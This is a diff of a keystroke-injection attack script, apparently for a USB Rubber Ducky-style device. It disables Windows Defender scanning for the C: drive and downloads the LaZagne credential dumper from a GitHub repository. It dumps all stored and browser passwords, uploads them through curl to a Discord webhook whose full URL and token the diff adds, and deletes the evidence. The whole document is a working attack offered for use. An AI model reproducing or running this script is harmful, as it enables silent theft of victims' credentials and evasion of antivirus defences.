@@ -68,10 +68,10 @@ DELAY 1000
 STRING Add-MpPreference -ExclusionPath "C:"
 ENTER
 DELAY 3000
-STRING $Test = [System.Environment]::GetEnvironmentVariable('TEMP','Machine');Start-BitsTransfer https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe -Destination "$Test/l.exe"; cd $Test
+STRING $Test = [System.Environment]::GetEnvironmentVariable('TEMP','Machine');Start-BitsTransfer https://github.com/javirufo-ies/hacking/raw/refs/heads/main/LaZagne.exe-Destination "$Test/l.exe"; cd $Test
 ENTER
 DELAY 15000
-STRING .\l.exe all -vv > "$env:computername.txt"; .\l.exe browsers -vv >> "$env:computername.txt"; curl.exe [DISCORD WEBHOOK URL] -F "file1=@$Test/$env:computername.txt"; Remove-Item "$x/$env:computername.txt", "$x/l.exe" -Force -ErrorAction SilentlyContinue
+STRING .\l.exe all -vv > "$env:computername.txt"; .\l.exe browsers -vv >> "$env:computername.txt"; curl.exe https://discord.com/api/webhooks/1447492875704205362/VyqK99hc7pwqsloWyBulkjPktt7zdS6QqDLeaUyovN4pFrWMsBD3fP2ue0ubyBYMNGms -F "file1=@$Test/$env:computername.txt"; Remove-Item "$x/$env:computername.txt", "$x/l.exe" -Force -ErrorAction SilentlyContinue
 ENTER
 STRING exit
 ENTER
